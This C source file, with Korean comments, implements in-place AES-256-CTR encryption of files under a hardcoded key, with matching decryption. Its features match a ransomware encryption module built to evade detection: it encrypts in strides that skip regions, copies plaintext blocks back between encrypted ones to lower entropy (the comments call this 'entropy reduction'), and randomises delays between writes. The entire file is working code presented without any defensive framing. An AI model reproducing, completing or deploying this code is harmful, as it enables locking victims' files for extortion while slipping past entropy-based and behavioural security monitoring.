#include "crypto.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>     // usleep, fsync
#include <stdint.h>     // uint64_t
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/sha.h>
#include <arpa/inet.h> 
#include <endian.h>     // be64toh, htobe64 (리눅스 표준)

#ifndef CHUNK_SIZE
#define CHUNK_SIZE (128 * 1024)
#endif

// Static AES Key
static const unsigned char aes_key[32] = {
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
    0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F
};

void handle_openssl_errors(void) {
    ERR_print_errors_fp(stderr);
}

/**
 * @brief 스마트 지터 지연 함수
 * 딜레이 시간 랜덤화(110ms ~ 130ms)와 휴식모드 도입
 */
void smart_jitter_delay() {
    static int was_last_fast = 0; // 초기값: 0 (처음엔 보통 모드로 시작)
    int delay;

    if (was_last_fast) {
        // [휴식 모드]
        // 이전에 빨랐으므로(0.12 미만), 이번엔 0.12 ~ 0.13 사이로 강제 조정
        // 절대 0.11이 나오지 않게 함 -> 연속 고속 방지
        // 범위: 120,000 ~ 130,000 (0.12s ~ 0.13s)
        delay = 120000 + (rand() % 10001); 
        was_last_fast = 0; // 휴식 완료
    } else {
        // [자유 모드]
        // 범위: 110,000 ~ 130,000 (0.11s ~ 0.13s)
        delay = 110000 + (rand() % 20001);

        // 이번 딜레이가 0.12초 미만(즉, 0.11초 대)이었다면 다음 딜레이는 휴식 모드로
        if (delay < 120000) {
            was_last_fast = 1;
        }
    }
    usleep(delay);
}

// 경로 기반 해시 IV 생성
void generate_iv_from_path(const char *filepath, unsigned char *iv_out) {
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256_CTX sha256;
    SHA256_Init(&sha256);
    SHA256_Update(&sha256, filepath, strlen(filepath));
    SHA256_Final(hash, &sha256);
    memcpy(iv_out, hash, 16);
}

/**
 * @brief 오프셋 기반 IV 동기화
 * AES-CTR 모드는 스트림 암호이므로, 파일 중간부터 암호화할 때
 * Counter 값을 정확히 맞춰주지 않으면 복호화 불가.
 * Logic:
 * 1. Base IV = FilePath 기반 SHA256 해시값
 * 2. Counter = Offset / 16 (AES Block Size)
 * 3. IV += Counter
 */
void calculate_chunk_iv(const char *filepath, long offset, unsigned char *iv_out) {
    // 1. 기본 해시 IV 생성
    generate_iv_from_path(filepath, iv_out);

    // 2. 오프셋에 따른 블록 카운터 계산
    uint64_t block_counter = offset / 16;
    
    // 3. IV 하위 8바이트에 카운터 가산
    if (block_counter > 0) {
        uint64_t *counter_ptr = (uint64_t*)(iv_out + 8);
        uint64_t host_counter = be64toh(*counter_ptr);
        host_counter += block_counter;
        *counter_ptr = htobe64(host_counter);
    }
}

/**
 * Stride 지원 Worker
 * @param skip_distance: 한 번 쓰고 나서 건너뛸 거리
 */
static int process_chunk_stride(const char *filepath, long start_offset, int chunks_to_write, long stride_chunk_size, long skip_distance, int mode) {
    FILE *fp = fopen(filepath, "r+b");
    if (!fp) {
        perror("fopen (r+b)");
        return -1; 
    }

    // 메모리 할당
    unsigned char *in_buf = malloc(stride_chunk_size);
    unsigned char *out_buf = malloc(stride_chunk_size + EVP_MAX_BLOCK_LENGTH);

    if (!in_buf || !out_buf) {
        perror("malloc failed");
        if (in_buf) free(in_buf);
        if (out_buf) free(out_buf);
        fclose(fp);
        return -1;
    }

    // Context 생성
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) { 
        free(in_buf); free(out_buf); fclose(fp);
        return -1; 
    }

    int ret = 0; // 성공 기본값
    long current_pos = start_offset; // 현재 파일 포인터 위치
    int out_len;
    unsigned char current_iv[16]; // 매 청크마다 계산될 IV

    // =================================================================
    // Stride 루프 구조: Init -> Update -> Write -> Skip -> Sleep
    // =================================================================
    for (int i = 0; i < chunks_to_write; i++) {
        
        // 1. 읽기 위치로 이동
        if (fseek(fp, current_pos, SEEK_SET) != 0) break; // 파일 끝 등 에러

        // 2. 읽기
        int read_len = fread(in_buf, 1, stride_chunk_size, fp);
        if (read_len <= 0) break; 

        // 3. 현재 위치(current_pos)에 맞는 IV 계산
        // 불연속적인 위치 접근이므로 매 청크마다 IV를 재설정해야 함.
        calculate_chunk_iv(filepath, current_pos, current_iv);

        // 4. 암/복호화 초기화 (Init)
        if (mode == 0) { // ENCRYPT
            if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, aes_key, current_iv)) {
                handle_openssl_errors(); ret = -1; break;
            }
            if (1 != EVP_EncryptUpdate(ctx, out_buf, &out_len, in_buf, read_len)) {
                handle_openssl_errors(); ret = -1; break;
            }
        } else { // DECRYPT
            if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, aes_key, current_iv)) {
                handle_openssl_errors(); ret = -1; break;
            }
            if (1 != EVP_DecryptUpdate(ctx, out_buf, &out_len, in_buf, read_len)) {
                handle_openssl_errors(); ret = -1; break;
            }
        }

        // 5.샌드위치 기법 (Entropy Reduction)
        // 암호화된 버퍼 중간중간에 원본(Plaintext) 블록을 강제로 덮어씀.
        int stripe_size = 16; 
        for (int k = 0; k < out_len; k += (stripe_size * 2)) {
            int skip_offset = k + stripe_size;
            if (skip_offset < out_len) {
                int copy_len = stripe_size;
                if (skip_offset + copy_len > out_len) {
                    copy_len = out_len - skip_offset;
                }
                memcpy(out_buf + skip_offset, in_buf + skip_offset, copy_len);
            }
        }

        // 6. 쓰기 (읽었던 위치에 그대로 덮어쓰기)
        fseek(fp, current_pos, SEEK_SET);
        fwrite(out_buf, 1, out_len, fp);
        fflush(fp); 

        // 7.다음 위치 계산 (Stride 적용)
        // 읽은 만큼 + 건너뛸 만큼 점프
        current_pos += read_len + skip_distance;

        // 8. 딜레이
        smart_jitter_delay();
    }
    
    // 루프 종료 후 정리
    EVP_CIPHER_CTX_free(ctx);
    free(in_buf);
    free(out_buf);
    fsync(fileno(fp));
    fclose(fp);
    return ret;
}

// 암호화를 위한 래핑 함수
int encrypt_chunk_stride(const char *filepath, long start_offset, int chunks, long chunk_size, long skip_distance) {
    return process_chunk_stride(filepath, start_offset, chunks, chunk_size, skip_distance, 0);
}

// 복호화를 위한 래핑 함수
int decrypt_chunk_stride(const char *filepath, long start_offset, int chunks, long chunk_size, long skip_distance) {
    return process_chunk_stride(filepath, start_offset, chunks, chunk_size, skip_distance, 1);
}